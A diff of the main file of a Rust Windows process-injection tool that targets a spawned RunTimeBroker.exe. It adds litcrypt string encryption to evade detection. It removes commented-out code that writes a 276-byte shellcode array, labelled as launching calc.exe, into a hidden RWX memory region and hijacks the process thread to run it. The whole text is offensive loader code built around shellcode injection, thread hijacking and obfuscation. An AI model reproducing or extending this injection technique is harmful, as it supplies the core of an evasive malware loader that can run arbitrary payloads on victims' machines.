@@ -1,10 +1,9 @@
-//use noldr::{get_dll_address, get_teb};
-//use winapi::um::processthreadsapi::CreateProcessA;
-//use winapi::um::processthreadsapi::PROCESS_INFORMATION;
-//use winapi::um::processthreadsapi::STARTUPINFOA;
-//use winapi::um::winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS};
-
 mod func;
+
+#[macro_use]
+extern crate litcrypt;
+
+use_litcrypt!();
 
 //shellcode to pop calc.exe
 pub const SHELL_CODE: [u8; 276] = [
@@ -29,125 +28,6 @@ pub const SHELL_CODE: [u8; 276] = [
 ];
 
 fn main() {
-    /*
-    //set the process name to RunTimeBroker.exe for testing
-    let process_name = "RunTimeBroker.exe".to_string();
-    //format the process path
-    let process_path = if !process_name.contains('\\') {
-        format!("C:\\Windows\\System32\\{}", process_name)
-    } else {
-        process_name
-    };
-
-    //create the startup info and process info structs
-    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
-    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
-    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-
-    //create the process
-    let success = unsafe {
-        CreateProcessA(
-            std::ptr::null(),
-            process_path.as_ptr() as *mut i8,
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-            1,
-            NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS,
-            std::ptr::null_mut(),
-            std::ptr::null(),
-            &mut si,
-            &mut pi,
-        )
-    };
-
-    //check if the process was created successfully
-    if success == 0 {
-        eprintln!("Failed to create process: {}", unsafe {
-            winapi::um::errhandlingapi::GetLastError()
-        });
-        std::process::exit(1);
-    }
-
-    println!("Process created successfully");
-    println!("Process Handle: 0x{:x}", pi.hProcess as usize);
-    println!("Thread Handle: 0x{:x}", pi.hThread as usize);
-    println!("Process ID: {}", pi.dwProcessId);
-    println!("Thread ID: {}", pi.dwThreadId);
-
-    //print msg "Press enter to snapshot the process"
-    println!("Press enter to snapshot the process");
-    let mut input = String::new();
-    std::io::stdin().read_line(&mut input).unwrap();
-
-    let process_handle = pi.hProcess;
-
-    /*
-
-    // Capture just the snapshot handle value
-    let snapshot_handle = match func::capture_process_snapshot(process_handle) {
-        Ok(handle) => handle,
-        Err(e) => {
-            eprintln!("Failed to capture snapshot: {}", e);
-            return;
-        }
-    };
-
-    println!("Snapshot handle: 0x{:x}", &snapshot_handle as *const _ as usize);
-
-    // Create a walk marker handle
-    let mut walker = HPSSWALK::default();
-    let pss_success = unsafe { PssWalkMarkerCreate(None, &mut walker) };
-
-    if pss_success != ERROR_SUCCESS {
-        eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", pss_success);
-    } else {
-        println!("PssWalkMarkerCreate succeeded");
-    }
-
-    //print the walk marker handle
-    println!("Walk Marker Handle: 0x{:?}", walker);
-    */
-
-    let shellcode_size = SHELL_CODE.len();
-    let shellcode_location =
-        func::get_hidden_injection_address(process_handle, shellcode_size).unwrap();
-
-    //println!("Shellcode location: 0x{:x}", shellcode_location as usize);
-
-    // Add this code to inject the shellcode
-    if !func::inject_and_rwx(process_handle, shellcode_location, &SHELL_CODE) {
-        eprintln!("Failed to inject shellcode");
-        std::process::exit(1);
-    }
-
-    println!(
-        "Shellcode injected successfully at: 0x{:x}",
-        shellcode_location as usize
-    );
-
-    // ... after shellcode injection ...
-
-    println!("Press enter to hijack the thread");
-    let mut input = String::new();
-    std::io::stdin().read_line(&mut input).unwrap();
-
-    // Hijack the thread to execute the shellcode
-    if !func::snap_thread_hijack(
-        pi.dwProcessId,
-        pi.hThread,
-        pi.dwThreadId,
-        process_handle,
-        Some(shellcode_location),
-        None,
-    ){
-        eprintln!("Failed to hijack thread");
-        std::process::exit(1);
-    }
-
-    println!("Thread hijacked successfully");
-    */
-
-    //snapinject_rs::inject_calc_shellcode("RunTimeBroker.exe").unwrap();
 
     let process_name = "RunTimeBroker.exe".to_string();
 
